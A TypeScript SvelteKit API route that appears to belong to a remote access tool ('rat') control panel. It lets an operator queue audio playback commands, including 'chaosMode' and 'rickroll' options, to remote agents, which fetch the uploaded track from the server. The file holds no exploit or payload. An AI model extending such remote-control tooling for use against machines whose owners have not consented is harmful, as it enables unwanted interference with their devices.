import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { audioBridgeManager } from '$lib/server/rat/audio';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator } from '$lib/server/authorization';
import type { AudioControlCommandPayload } from '$lib/types/audio';

interface PlaybackRequest {
	intent: 'play' | 'pause' | 'resume' | 'stop';
	trackId?: string;
	deviceId?: string;
	deviceLabel?: string;
	volume?: number;
	loop?: boolean;
	chaosMode?: boolean;
	rickroll?: boolean;
}

function normalize(body: Record<string, unknown>): PlaybackRequest {
	const request: PlaybackRequest = { intent: 'play' };
	if (body.intent === 'pause' || body.intent === 'resume' || body.intent === 'stop') {
		request.intent = body.intent;
	}
	if (typeof body.trackId === 'string') {
		request.trackId = body.trackId;
	}
	if (typeof body.deviceId === 'string') {
		request.deviceId = body.deviceId;
	}
	if (typeof body.deviceLabel === 'string') {
		request.deviceLabel = body.deviceLabel;
	}
	if (typeof body.volume === 'number' && Number.isFinite(body.volume)) {
		request.volume = Math.max(0, Math.min(1, body.volume));
	}
	if (typeof body.loop === 'boolean') {
		request.loop = body.loop;
	}
	if (typeof body.chaosMode === 'boolean') {
		request.chaosMode = body.chaosMode;
	}
	if (typeof body.rickroll === 'boolean') {
		request.rickroll = body.rickroll;
	}
	return request;
}

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let payload: Record<string, unknown> = {};
	try {
		payload = (await request.json()) as Record<string, unknown>;
	} catch {
		payload = {};
	}

	const playback = normalize(payload);
	if (!playback.trackId && playback.intent === 'play') {
		throw error(400, 'Track identifier is required');
	}
	if (playback.intent === 'play' && !playback.deviceId) {
		throw error(400, 'Output device identifier is required');
	}

	let command: AudioControlCommandPayload;
	if (playback.intent === 'play') {
		const track = playback.trackId ? audioBridgeManager.getUpload(id, playback.trackId) : null;
		if (!track) {
			throw error(404, 'Audio track not found');
		}

		const pcm = await audioBridgeManager.getUploadPCM(id, track.id);
		const absoluteUrl = new URL(`/api/agents/${id}/audio/uploads/${track.id}`, request.url);
		absoluteUrl.searchParams.set('format', 'pcm');

		command = {
			action: 'playback-start',
			trackId: track.id,
			trackUrl: absoluteUrl.toString(),
			outputDeviceId: playback.deviceId,
			outputDeviceLabel: playback.deviceLabel,
			volume: playback.volume,
			loop: playback.loop,
			chaosMode: playback.chaosMode,
			rickroll: playback.rickroll,
			sampleRate: pcm?.format.sampleRate ?? 48000,
			channels: pcm?.format.channels ?? 1
		} satisfies AudioControlCommandPayload;
	} else if (playback.intent === 'pause') {
		if (!playback.trackId) {
			throw error(400, 'Track identifier is required to pause');
		}
		command = {
			action: 'playback-pause',
			trackId: playback.trackId
		} satisfies AudioControlCommandPayload;
	} else if (playback.intent === 'resume') {
		if (!playback.trackId) {
			throw error(400, 'Track identifier is required to resume');
		}
		command = {
			action: 'playback-resume',
			trackId: playback.trackId
		} satisfies AudioControlCommandPayload;
	} else {
		if (!playback.trackId) {
			throw error(400, 'Track identifier is required to stop playback');
		}
		command = {
			action: 'playback-stop',
			trackId: playback.trackId
		} satisfies AudioControlCommandPayload;
	}

	try {
		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue audio playback command');
	}

	return json({ ok: true, command: command.action });
};
